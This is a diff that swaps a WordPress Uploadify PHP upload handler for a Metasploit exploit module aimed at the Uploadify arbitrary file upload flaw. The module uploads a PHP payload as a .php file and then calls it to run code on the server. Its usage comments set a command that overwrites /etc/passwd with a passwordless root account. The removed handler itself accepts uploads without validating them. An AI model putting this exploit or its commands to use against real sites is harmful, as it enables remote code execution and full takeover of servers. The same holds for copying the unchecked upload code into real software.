@@ -1,88 +1,99 @@
-<?php
-/*
-Uploadify v2.1.4
-Release Date: November 8, 2010
-
-Copyright (c) 2010 Ronnie Garcia, Travis Nickels
-
-Permission is hereby granted, free of charge, to any person obtaining a copy
-of this software and associated documentation files (the "Software"), to deal
-in the Software without restriction, including without limitation the rights
-to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
-copies of the Software, and to permit persons to whom the Software is
-furnished to do so, subject to the following conditions:
-
-The above copyright notice and this permission notice shall be included in
-all copies or substantial portions of the Software.
-
-THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
-IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
-FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
-AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
-LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
-OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
-THE SOFTWARE.
-*/
-
-ini_set('display_errors',1);
-error_reporting(E_ALL);
-
-include_once('../../../../wp-config.php');
-
-include_once('../../../../wp-load.php');
-
-include_once('../../../../wp-includes/wp-db.php');
-
-function insert_attachment($file_handler,$post_id,$setthumb='false') {
-
-  // check to make sure its a successful upload
-  if ($_FILES[$file_handler]['error'] !== UPLOAD_ERR_OK) __return_false();
-
-  require_once(ABSPATH . "wp-admin" . '/includes/image.php');
-  require_once(ABSPATH . "wp-admin" . '/includes/file.php');
-  require_once(ABSPATH . "wp-admin" . '/includes/media.php');
-
-  $attach_id = media_handle_upload( $file_handler, $post_id );
-
-  if ($setthumb) update_post_meta($post_id,'_thumbnail_id',$attach_id);
-  return $attach_id;
-}
-function vspi_check_thumb(){
-   $postid = $_REQUEST['postid'];
-    if(get_post_meta($postid,'_thumbnail_id')) return false;
-    return true;
-  }
-
-if (!empty($_FILES)) {
-    $image_id = insert_attachment('Filedata', $_REQUEST['postid'], vspi_check_thumb());
-}
-echo $image_id;
-
-
-/*
-if (!empty($_FILES)) {
-	$tempFile = $_FILES['Filedata']['tmp_name'];
-	$targetPath = $_SERVER['DOCUMENT_ROOT'] . $_REQUEST['folder'] . '/';
-	$targetFile =  str_replace('//','/',$targetPath) . $_FILES['Filedata']['name'];
-	
-	// $fileTypes  = str_replace('*.','',$_REQUEST['fileext']);
-	// $fileTypes  = str_replace(';','|',$fileTypes);
-	// $typesArray = split('\|',$fileTypes);
-	// $fileParts  = pathinfo($_FILES['Filedata']['name']);
-	
-	// if (in_array($fileParts['extension'],$typesArray)) {
-		// Uncomment the following line if you want to make the directory if it doesn't exist
-		// mkdir(str_replace('//','/',$targetPath), 0755, true);
-		
-		move_uploaded_file($tempFile,$targetFile);
-		//echo str_replace($_SERVER['DOCUMENT_ROOT'],'',$targetFile);
-        //$itemid = $_REQUEST('itemid');
-        //echo $itemid;
-        alert($_REQUEST['itemid']);
-	// } else {
-	// 	echo 'Invalid file type.';
-	// }
-}
-*/
-
-?>
+require 'msf/core'
+class Metasploit3 < Msf::Exploit::Remote
+Rank = ExcellentRanking
+include Msf::Exploit::Remote::HttpClient
+def initialize(info = {})
+super(update_info(info,
+'Name' => 'Uploadify jQuery Generic File Upload',
+'Description' => %q{
+This module exploits an arbitrary File Upload and Code Execution flaw Uploadify script
+(jQuery Multiple File Upload), the vulnerability allows for arbitrary file upload
+and remote code execution POST Data to Vulnerable (uploadify.php) in any CMS/SCRIPT use Uploadify.
+},
+'Author' => [ 'KedAns-Dz <ked-h[at]1337day.com>' ], # MSF Module
+'License' => MSF_LICENSE,
+'Version' => '0.1', # Beta Version Just for Pene-Test/Help !
+'References' => [
+'URL', 'http://1337day.com/related/18686',
+'URL', 'http://1337day.com/related/19980'
+],
+'Privileged' => false,
+'Payload' =>
+{
+'Compat' => { 'ConnectionType' => 'find', },
+},
+'Platform' => 'php',
+'Arch' => ARCH_PHP,
+'Targets' => [[ 'Automatic', { }]],
+'DisclosureDate' => 'Jun 16 2012',
+'DefaultTarget' => 0))
+register_options(
+[
+OptString.new('TARGETURI', [true, "The URI path CMS/Plugin/Module ", "/"]),
+OptString.new('PLUGIN', [true, "The Full URI path to Uploadify (jQuery)", "/"]),
+OptString.new('UDP', [true, "Full Path After Upload", "/"])
+####
+# Example (1) in WP Plugin :
+# set TARGETURI http://127.0.0.1/wp
+# set PLUGIN wp-content/plugins/foxypress/uploadify/uploadify.php
+# set UDP wp-content/affiliate_images/
+# set RHOST 127.0.0.1
+# set PAYLOAD php/exec
+# set CMD echo "toor::0:0:::/bin/bash">/etc/passwd
+# exploit
+####
+# Example (2) in JOS Module :
+# set TARGETURI http://127.0.0.1/jos
+# set PLUGIN modules/pm_advancedsearch4/js/uploadify/uploadify.php?folder=/modules/pm_advancedsearch4/
+# set UDP modules/pm_advancedsearch4/
+# set RHOST 127.0.0.1
+# set PAYLOAD php/exec
+# set CMD echo "toor::0:0:::/bin/bash">/etc/passwd
+# exploit
+####
+ 
+], self.class)
+end
+def check
+uri = datastore['TARGETURI']
+plug = datastore['PLUGIN']
+res = send_request_cgi({
+'method' => 'GET',
+'uri' => "#{uri}'/'#{plug}"
+})
+if res and res.code == 200
+return Exploit::CheckCode::Detected
+else
+return Exploit::CheckCode::Safe
+end
+end
+def exploit
+uri = datastore['TARGETURI']
+plug = datastore['PLUGIN']
+path = datastore['UDP']
+peer = "#{rhost}:#{rport}"
+post_data = Rex::MIME::Message.new
+post_data.add_part("<?php #{payload.encoded} ?>",
+"application/octet-stream", nil,
+"form-data; name=\"Filedata\"; filename=\"#{rand_text_alphanumeric(6)}.php\"")
+print_status("#{peer} - Sending PHP payload")
+res = send_request_cgi({
+'method' => 'POST',
+'uri' => "#{uri}'/'#{plug}",
+'ctype' => 'multipart/form-data; boundary=' + post_data.bound,
+'data' => post_data.to_s
+})
+if not res or res.code != 200 or res.body !~ /\{\"raw_file_name\"\:\"(\w+)\"\,/
+print_error("#{peer} - File wasn't uploaded, aborting!")
+return
+end
+print_good("#{peer} - Our payload is at: #{$1}.php! Calling payload...")
+res = send_request_cgi({
+'method' => 'GET',
+'uri' => "#{uri}'/'#{path}'/'#{$1}.php"
+})
+if res and res.code != 200
+print_error("#{peer} - Server returned #{res.code.to_s}")
+end
+end
+end
